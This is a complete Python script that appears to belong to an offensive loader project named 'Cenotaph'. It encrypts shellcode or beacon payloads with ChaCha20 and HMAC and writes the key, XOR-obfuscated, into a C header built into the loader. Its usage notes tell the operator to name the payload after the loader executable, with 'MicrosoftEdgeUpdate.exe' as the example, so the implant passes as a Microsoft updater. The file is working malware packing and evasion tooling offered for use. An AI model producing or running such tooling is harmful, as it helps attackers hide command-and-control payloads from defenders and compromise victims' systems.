#!/usr/bin/env python3
"""
Cenotaph payload encryptor.

Encrypts a shellcode / beacon payload into the Cenotaph .dat format:
    nonce(12 bytes) || ChaCha20 ciphertext || HMAC-SHA256(32 bytes)

The HMAC is computed over nonce || ciphertext.  The ChaCha20 key is a random
32-byte value embedded XOR-obfuscated in the Cenotaph binary via
include/CenKey.h.

Usage:
    # Generate a fresh random key header only:
    python3 tools/encrypt.py --header include/CenKey.h

    # Encrypt a payload with the current key (or generate a new one):
    python3 tools/encrypt.py --payload nax.x64.bin --dat nax.dat \
                             --header include/CenKey.h

    # In a Makefile-friendly one-liner:
    python3 tools/encrypt.py --payload nax.x64.bin --dat cenotaph.dat \
                             --header include/CenKey.h

The output .dat must be renamed to match the Cenotaph executable stem, e.g.
`MicrosoftEdgeUpdate.exe` + `MicrosoftEdgeUpdate.dat`.
"""

import argparse
import os
import sys
from pathlib import Path


def fnv1a_32(s: str) -> int:
    h = 0x811C9DC5
    for ch in s.upper():
        h ^= ord(ch)
        h = (h * 0x01000193) & 0xFFFFFFFF
    return h


def chacha20_encrypt(plaintext: bytes, key: bytes, nonce: bytes) -> bytes:
    from Crypto.Cipher import ChaCha20
    cipher = ChaCha20.new(key=key, nonce=nonce)
    return cipher.encrypt(plaintext)


def hmac_sha256(key: bytes, msg: bytes) -> bytes:
    from Crypto.Hash import HMAC, SHA256
    return HMAC.new(key, msg, digestmod=SHA256).digest()


def make_key_header(key: bytes, obf: int) -> str:
    xkey = [k ^ obf for k in key]
    lines = ["/* Generated by tools/encrypt.py — do not edit by hand. */",
             "#ifndef CENOTAPH_KEY_H",
             "#define CENOTAPH_KEY_H",
             "",
             f"#define CEN_OBF_BYTE 0x{obf:02X}",
             "",
             "static const UCHAR EKEY[32] __attribute__((used)) = {"]
    for i in range(0, 32, 8):
        vals = ", ".join(f"0x{b:02X}" for b in xkey[i:i+8])
        lines.append(f"    {vals},")
    lines[-1] = lines[-1].rstrip(",")
    lines.extend(["};", "", "#endif /* CENOTAPH_KEY_H */", ""])
    return "\n".join(lines)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--payload", type=Path, help="raw payload file to encrypt")
    parser.add_argument("--dat", type=Path, help="output encrypted .dat file")
    parser.add_argument("--header", type=Path, default=Path("include/CenKey.h"),
                        help="output C key header (default: include/CenKey.h)")
    parser.add_argument("--keep-header", action="store_true",
                        help="keep existing header key instead of regenerating")
    args = parser.parse_args()

    if args.payload and not args.dat:
        print("[!] --dat required when --payload is given", file=sys.stderr)
        return 1

    if args.keep_header and args.header.exists():
        # parse existing key and obfuscation byte from header
        text = args.header.read_text()
        obf = 0
        xkey = []
        for line in text.splitlines():
            if "CEN_OBF_BYTE" in line:
                obf = int(line.split("0x")[-1].strip(), 16)
            if "0x" in line and "EKEY" not in line and "CEN_OBF" not in line:
                for tok in line.split(","):
                    tok = tok.strip()
                    if tok.startswith("0x"):
                        xkey.append(int(tok, 16))
        if len(xkey) != 32:
            print("[!] failed to parse existing header", file=sys.stderr)
            return 1
        key = bytes(b ^ obf for b in xkey)
    else:
        key = os.urandom(32)
        obf = os.urandom(1)[0]

    args.header.write_text(make_key_header(key, obf), encoding="utf-8")
    print(f"[+] wrote key header: {args.header} (obf=0x{obf:02X})")

    if args.payload:
        plaintext = args.payload.read_bytes()
        if not plaintext:
            print("[!] payload empty", file=sys.stderr)
            return 1

        nonce = os.urandom(12)
        ciphertext = chacha20_encrypt(plaintext, key, nonce)
        mac = hmac_sha256(key, nonce + ciphertext)
        blob = nonce + ciphertext + mac
        args.dat.write_bytes(blob)
        print(f"[+] wrote encrypted payload: {args.dat} "
              f"({len(plaintext)} bytes plaintext, {len(blob)} bytes total)")

    return 0


if __name__ == "__main__":
    sys.exit(main())
